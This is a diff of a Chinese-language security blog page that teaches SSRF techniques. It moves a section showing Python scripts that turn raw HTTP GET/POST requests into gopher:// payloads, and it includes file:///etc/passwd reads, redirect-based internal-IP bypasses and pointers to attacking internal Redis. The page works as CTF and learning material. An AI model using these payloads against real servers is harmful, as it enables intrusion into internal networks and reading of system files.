@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://image.3001.net/images/20210114/1610598043_5fffc69b181c82c561065.png">
 <meta property="og:image" content="http://shimm3r.github.io/image/8.png">
 <meta property="article:published_time" content="2022-08-13T03:32:17.000Z">
-<meta property="article:modified_time" content="2022-08-21T07:52:47.525Z">
+<meta property="article:modified_time" content="2022-08-21T07:58:44.670Z">
 <meta property="article:author" content="shimm3r">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small">
@@ -254,7 +254,7 @@
         
         
         
-          169 mins
+          168 mins
         
       </span>
     
@@ -386,7 +386,52 @@
 
 <h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a><strong>file协议</strong></h3><p>(读取内网文件)</p>
 <p>用file协议代替http协议或者https协议（如果过滤了）。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。</p>
-<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a><strong>gopher协议</strong></h3><p>后面有例子</p>
+<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a><strong>gopher协议</strong></h3><p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p>
+<p><strong>（1）Gopher协议格式</strong></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">URL:</span> <span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-title class_">TCP</span>数据流<br><br><span class="hljs-comment"># 注意不要忘记后面那个下划线&quot;_&quot;，下划线&quot;_&quot;后面才开始接TCP数据流，如果不加这个&quot;_&quot;，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>gopher的默认端口是70</li>
+<li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
+</ul>
+<blockquote>
+<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p>
+<ol>
+<li>抓取或构造HTTP数据包</li>
+<li>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code>（这是请求头里每行结束的标志，通常和crlf漏洞相关）</li>
+<li>发送符合gopher协议格式的请求</li>
+</ol>
+</blockquote>
+<p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/echo.php?whoami=Bunny</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br></code></pre></td></tr></table></figure>
+
+<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意这几个问题：</strong></p>
+<ol>
+<li>问号（?）需要转码为URL编码，也就是%3f</li>
+<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li>
+<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
+</ol>
+</blockquote>
+<p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/echo.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">whoami</span><span class="hljs-operator">=</span>Bunny</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p>
+<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 12</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami=Bunny</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
+
+<p>例题 <strong>[2020 科来杯初赛]Web1</strong></p>
 <h2 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a>一些姿势</h2><h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3><p>（1）短地址跳转绕过，这里也给出一个网址</p>
 <p><a target="_blank" rel="noopener" href="https://urlify.cn/">https://urlify.cn/</a></p>
 <p> (2)网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p>
@@ -470,52 +515,6 @@
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span><br><span class="hljs-symbol">http:</span>//google.com<span class="hljs-meta"># @secret.corp</span><br></code></pre></td></tr></table></figure>
 
 <p>这里SSRF漏洞产生的根本原因是url中有空格(CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p>
-<h3 id="常见攻击方式（Gopher协议）"><a href="#常见攻击方式（Gopher协议）" class="headerlink" title="常见攻击方式（Gopher协议）"></a>常见攻击方式（Gopher协议）</h3><p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p>
-<p><strong>（1）Gopher协议格式</strong></p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">URL:</span> <span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-title class_">TCP</span>数据流<br><br><span class="hljs-comment"># 注意不要忘记后面那个下划线&quot;_&quot;，下划线&quot;_&quot;后面才开始接TCP数据流，如果不加这个&quot;_&quot;，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>gopher的默认端口是70</li>
-<li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
-</ul>
-<blockquote>
-<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p>
-<ol>
-<li>抓取或构造HTTP数据包</li>
-<li>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code>（这是请求头里每行结束的标志，通常和crlf漏洞相关）</li>
-<li>发送符合gopher协议格式的请求</li>
-</ol>
-</blockquote>
-<p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/echo.php?whoami=Bunny</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br></code></pre></td></tr></table></figure>
-
-<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>注意这几个问题：</strong></p>
-<ol>
-<li>问号（?）需要转码为URL编码，也就是%3f</li>
-<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li>
-<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
-</ol>
-</blockquote>
-<p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/echo.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">whoami</span><span class="hljs-operator">=</span>Bunny</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p>
-<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 12</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami=Bunny</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
-
-<p>例题 <strong>[2020 科来杯初赛]Web1</strong></p>
 <h3 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h3><p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
 <blockquote>
 <p><strong>什么是Redis未授权访问？</strong></p>
